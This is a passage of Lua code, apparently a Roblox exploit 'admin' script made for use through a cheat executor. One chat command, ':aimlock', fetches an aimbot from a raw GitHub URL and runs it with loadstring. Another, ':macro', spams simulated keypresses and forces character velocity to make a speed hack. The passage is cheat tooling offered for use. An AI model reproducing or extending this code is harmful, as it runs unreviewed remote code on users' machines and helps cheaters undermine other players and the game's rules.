        if fU:match(":aimlock") then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/wfwf/main/aimbot"))()
        end
    end
)
game.Players.LocalPlayer.Chatted:connect(
    function(fU)
        if fU:match(":macro") then
            local u = game:GetService("Players").LocalPlayer
            local ck = u:GetMouse()
            local g0 = false
            local g1 = false
            local g2 = u.Backpack:FindFirstChild("Wallet")
            local g3 = Instance.new("Animation")
            function stopTracks()
                for n, O in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks(

                ) do
                    if O.Animation.AnimationId:match("rbxassetid") then
                        O:Stop()
                    end
                end
            end
            function loadAnimation(g4)
                if g3.AnimationId == g4 then
                    stopTracks()
                    g3.AnimationId = "1"
                else
                    g3.AnimationId = g4
                    local g5 =
                        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(
                        g3
                    )
                    g5:Play()
                end
            end
            ck.KeyDown:Connect(
                function(cm)
                    if cm == "t" then
                        g0 = not g0
                        if g0 == true then
                            loadAnimation("rbxassetid://3189777795")
                            wait(1.5)
                            g2.Parent = u.Character
                            wait(0.15)
                            u.Character:FindFirstChild("Wallet").Parent = u.Backpack
                            wait(0.05)
                            repeat
                                game:GetService("RunService").Heartbeat:wait()
                                keypress(0x49)
                                game:GetService("RunService").Heartbeat:wait()
                                keypress(0x4F)
                                game:GetService("RunService").Heartbeat:wait()
                                keyrelease(0x49)
                                game:GetService("RunService").Heartbeat:wait()
                                keyrelease(0x4F)
                                game:GetService("RunService").Heartbeat:wait()
                            until g0 == false
                        end
                    end
                end
            )
            ck.KeyDown:Connect(
                function(cm)
                    if cm == "y" then
                        g1 = not g1
                        if g1 == true then
                            repeat
                                local cf = game.Players.LocalPlayer.Character
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 140
                                wait(0.1)
                            until g1 == false
                        end
                    end
                end
            )
            game:GetService("StarterGui"):SetCore(
                "SendNotification",
                {Title = "t = start", Text = "y = speed", Time = 999999999999, Icon = "rbxassetid://505845268"}
            )
            game:GetService("StarterGui"):SetCore(
                "SendNotification",
                {Title = "By: Topcoldgaming", Text = ":D", Time = 10, Icon = "rbxassetid://505845268"}
            )
        end
    end
)
if game.Players.LocalPlayer == user_pre then
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {
            Title = "Premium User Loaded!",
            Text = "Chat :premcmds for a list of premium commands / chat :cmds for a commands",
            Time = 3,
            Icon = "rbxassetid://505845268"
        }
    )
else
    game:GetService("StarterGui"):SetCore(
        "SendNotification",
        {Title = "Admin Loaded!", Text = "Chat :cmds for a list of commands", Time = 3, Icon = "rbxassetid://505845268"}
    )
end
